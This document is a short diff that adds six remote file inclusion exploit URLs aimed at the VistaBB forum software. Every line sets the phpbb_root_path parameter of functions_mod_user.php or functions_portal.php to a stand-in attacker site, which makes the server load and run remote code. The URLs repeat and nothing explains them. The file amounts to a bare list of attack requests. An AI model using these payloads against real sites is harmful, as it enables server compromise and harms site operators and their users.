@@ -1,0 +1,6 @@
+http://www.example.com/[vistabbpath]/includes/functions_mod_user.php?phpbb_root_path=http://attackers'site
+http://www.example.com/[vistabbpath]/includes/functions_mod_user.php?phpbb_root_path=http://attackers'site
+http://www.example.com/[vistabbpath]/includes/functions_mod_user.php?phpbb_root_path=http://attackers'site
+http://www.example.com/[vistabbpath]/includes/functions_portal.php?phpbb_root_path=http://attackers'site
+http://www.example.com/[vistabbpath]/includes/functions_portal.php?phpbb_root_path=http://attackers'site
+http://www.example.com/[vistabbpath]/includes/functions_portal.php?phpbb_root_path=http://attackers'site
